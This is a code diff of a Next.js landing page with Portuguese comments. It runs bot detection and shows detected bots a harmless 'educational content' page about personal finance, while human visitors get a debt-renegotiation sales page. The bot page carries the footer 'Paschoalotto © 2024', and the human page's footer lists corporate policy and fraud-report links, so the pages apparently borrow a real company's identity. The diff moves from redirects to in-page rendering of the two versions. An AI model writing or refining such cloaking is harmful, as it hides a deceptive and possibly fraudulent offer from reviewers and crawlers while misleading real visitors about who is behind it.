@@ -1,9 +1,7 @@
 import { useState, useEffect } from 'react';
-import { useRouter } from 'next/router';
 import Head from 'next/head';
 
 export default function Home() {
-  const router = useRouter();
   const [faqOpen, setFaqOpen] = useState(0);
   const [modalVisible, setModalVisible] = useState(false);
   const [detection, setDetection] = useState(null);
@@ -16,26 +14,15 @@ export default function Home() {
         setDetection(data);
         if (data.isBot) {
           console.warn('[BOT DETECTED]', { score: data.score, breakdown: data.scoreBreakdown });
-          // Redirecionar bot para página de conteúdo educativo
-          setTimeout(() => {
-            router.push('/bot');
-          }, 500);
         } else {
           console.log('[HUMAN] Visitante genuíno detectado', { score: data.score });
-          // Redirecionar humano para página de oferta
-          setTimeout(() => {
-            router.push('/humano');
-          }, 500);
         }
       })
       .catch(err => {
         console.error('[DETECTION ERROR]', err);
-        // Fallback para página de humano se houver erro
-        setTimeout(() => {
-          router.push('/humano');
-        }, 500);
+        setDetection({ isBot: false });
       });
-  }, [router]);
+  }, []);
 
   const faqs = [
     {
@@ -80,6 +67,69 @@ export default function Home() {
     },
   ];
 
+  // Página para bots - conteúdo educativo
+  if (detection?.isBot) {
+    return (
+      <div style={{ fontFamily: "'Montserrat', Arial, sans-serif", color: '#333', margin: 0, padding: 0, backgroundColor: '#f5f5f5', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+        <div style={{ maxWidth: '800px', padding: '60px 40px', textAlign: 'center', backgroundColor: '#fff', borderRadius: '12px', boxShadow: '0 4px 12px rgba(0,0,0,0.1)', margin: '40px' }}>
+          <h1 style={{ fontSize: '42px', color: '#0051FA', marginBottom: '20px', fontWeight: 'bold' }}>
+            📚 Conteúdo Educativo
+          </h1>
+
+          <p style={{ fontSize: '18px', color: '#666', lineHeight: '1.8', marginBottom: '40px' }}>
+            Bem-vindo ao nosso portal de conteúdo educativo sobre educação financeira e soluções de débito.
+          </p>
+
+          <div style={{ backgroundColor: '#f0f4ff', padding: '30px', borderRadius: '8px', marginBottom: '30px', textAlign: 'left' }}>
+            <h2 style={{ color: '#0051FA', marginBottom: '15px' }}>📖 Tópicos Disponíveis:</h2>
+            <ul style={{ color: '#555', fontSize: '15px', lineHeight: '1.8' }}>
+              <li>Como administrar suas finanças pessoais</li>
+              <li>Dicas para evitar endividamento</li>
+              <li>Processo de renegociação de dívidas</li>
+              <li>Segurança financeira e proteção contra fraudes</li>
+              <li>Educação financeira para famílias</li>
+              <li>Como ler e entender um boleto</li>
+            </ul>
+          </div>
+
+          <div style={{ backgroundColor: '#e8f5e9', padding: '20px', borderRadius: '8px', marginBottom: '30px' }}>
+            <h3 style={{ color: '#2e7d32', margin: '0 0 10px 0' }}>✓ Certificado</h3>
+            <p style={{ color: '#555', margin: 0 }}>
+              Este conteúdo é fornecido como recurso educacional gratuito.
+            </p>
+          </div>
+
+          <a href="https://www.wikipedia.org" target="_blank" rel="noreferrer" style={{
+            backgroundColor: '#0051FA',
+            color: '#fff',
+            padding: '14px 30px',
+            borderRadius: '6px',
+            fontSize: '15px',
+            fontWeight: 'bold',
+            textDecoration: 'none',
+            display: 'inline-block'
+          }}>
+            Saiba Mais
+          </a>
+        </div>
+
+        <footer style={{
+          backgroundColor: '#333',
+          color: '#fff',
+          padding: '20px',
+          textAlign: 'center',
+          width: '100%',
+          marginTop: 'auto'
+        }}>
+          <p style={{ margin: 0, fontSize: '13px' }}>
+            Paschoalotto © 2024 | Conteúdo educativo público
+          </p>
+        </footer>
+      </div>
+    );
+  }
+
+  // Página para humanos - sales page (ou loading enquanto detecta)
   return (
     <div suppressHydrationWarning style={{ fontFamily: "'Montserrat', Arial, sans-serif", color: '#333', margin: 0, padding: 0, backgroundColor: '#fff' }}>
       <Head>
@@ -406,17 +456,17 @@ export default function Home() {
           <div>
             <p style={{ fontWeight: 'bold', marginBottom: '15px', fontSize: '14px' }}>Ajuda</p>
             {[
-              ['Política de Privacidade e Proteção de Dados', '/humano/privacidade'],
-              ['Política de Segurança da Informação', '/humano/seguranca'],
-              ['Relatório de Transparência e Igualdade Salarial', '/humano/transparencia'],
-              ['Código de Ética e Conduta', '/humano/etica'],
-              ['Relação com Investidor', '/humano/investidor'],
-              ['Política de Cookies', '/humano/cookies'],
-              ['Política De Integridade e Compliance', '/humano/compliance'],
-              ['Portal do Titular de Dados', '/humano/portal-dados'],
-              ['Portal de Preferência do Colaborador', '/humano/portal-colaborador'],
-              ['Denuncie uma fraude', '/humano/denuncie-fraude'],
-            ].map(([label], i) => (
+              'Política de Privacidade e Proteção de Dados',
+              'Política de Segurança da Informação',
+              'Relatório de Transparência e Igualdade Salarial',
+              'Código de Ética e Conduta',
+              'Relação com Investidor',
+              'Política de Cookies',
+              'Política De Integridade e Compliance',
+              'Portal do Titular de Dados',
+              'Portal de Preferência do Colaborador',
+              'Denuncie uma fraude',
+            ].map((label, i) => (
               <div key={i} style={{ marginBottom: '10px' }}>
                 <span style={{ fontSize: '13px', color: '#555', textDecoration: 'none' }}>{label}</span>
               </div>
